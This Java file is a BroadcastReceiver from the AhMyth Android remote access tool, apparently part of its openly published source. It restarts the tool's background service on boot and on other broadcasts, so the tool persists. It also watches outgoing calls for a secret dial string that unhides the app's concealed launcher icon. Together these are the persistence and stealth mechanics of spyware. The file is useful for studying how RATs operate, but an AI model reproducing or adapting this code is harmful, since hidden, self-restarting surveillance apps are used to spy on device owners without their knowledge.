package ahmyth.mine.king.ahmyth;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import androidx.core.content.ContextCompat;
import android.widget.Toast;

public class MyReceiver extends BroadcastReceiver {
    public MyReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        Intent serviceIntent = new Intent(context, MainService.class);
        ContextCompat.startForegroundService(context, serviceIntent);

        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Intent bootServiceIntent = new Intent(context, MainService.class);
            ContextCompat.startForegroundService(context, bootServiceIntent);
        }

        if (intent.getAction().equalsIgnoreCase(Intent.ACTION_NEW_OUTGOING_CALL)) {
            String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            if (phoneNumber.equalsIgnoreCase(context.getResources().getString(R.string.unhide_phone_number))) {
                SharedPreferences sharedPreferences = context.getSharedPreferences("AppSettings", Context.MODE_PRIVATE);
                boolean hidden_status = sharedPreferences.getBoolean("hidden_status", false);

                if (hidden_status) {
                    SharedPreferences.Editor appSettingEditor = sharedPreferences.edit();
                    appSettingEditor.putBoolean("hidden_status", false);
                    appSettingEditor.commit();

                    ComponentName componentName = new ComponentName(context, MainActivity.class);
                    context.getPackageManager()
                            .setComponentEnabledSetting(componentName,
                                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                                    PackageManager.DONT_KILL_APP);

                    Toast.makeText(context, "AhMyth's icon has been revealed!", Toast.LENGTH_SHORT).show();
                }
            }
        }
    }
} 